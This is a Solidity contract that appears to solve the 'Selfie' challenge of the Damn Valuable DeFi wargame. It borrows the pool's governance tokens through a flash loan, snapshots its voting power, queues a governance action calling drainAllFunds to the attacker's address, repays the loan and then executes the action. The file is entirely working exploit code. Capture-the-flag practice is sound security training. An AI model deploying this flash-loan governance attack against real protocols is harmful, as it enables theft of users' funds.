// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "hardhat/console.sol";
import "@openzeppelin/contracts/interfaces/IERC20.sol";
import "../DamnValuableTokenSnapshot.sol";

interface ISelfiePool {
    function flashLoan(uint256 borrowAmount) external;
}

interface ISimpleGovernance {

    function queueAction(address receiver, bytes calldata data, uint256 weiAmount) external returns (uint256);
    function executeAction(uint256 actionId) external payable;
}

contract GovernanceAttacker {

    address owner;

    DamnValuableTokenSnapshot govToken;
    ISelfiePool selfiePool;
    ISimpleGovernance simpleGovernance;
    uint256 amount;
    uint256 actionId;

    enum Status {QueueAction, ExecuteAction}

    Status status;

    constructor(
        address _govToken,
        address _simpleGovernance,
        address _selfiePool
        ) {
        owner = msg.sender;
        govToken = DamnValuableTokenSnapshot(_govToken);
        simpleGovernance = ISimpleGovernance(_simpleGovernance);
        selfiePool = ISelfiePool(_selfiePool);
    }

    //this is the function that will call the SelfiePool.flashLoan function
    function attackRewardPool() external {
        amount = govToken.balanceOf(address(selfiePool));
        selfiePool.flashLoan(amount);
    }

    //this is the function called by the pool
    function receiveTokens(address token, uint256 loanAmount) external payable {
        require(address(token) == address(govToken), "unexpected token received");
        require(loanAmount == amount, "unexpected amount received");

        govToken.snapshot();

        uint256 myBalanceAtSnapshot = govToken.getBalanceAtLastSnapshot(address(this));
        require(myBalanceAtSnapshot == amount, "wrong balance at snapshot");

        actionId = simpleGovernance.queueAction(
            address(selfiePool), //called contract
            abi.encodeWithSignature("drainAllFunds(address)", owner), //called function
            0 //value in Wei for the call
        );
        //paying back the loan
        IERC20(token).transfer(address(selfiePool), amount);
    }

    function finalAttack() external {
        simpleGovernance.executeAction(actionId);
        uint256 ownerBalance = govToken.balanceOf(owner);
    }
}
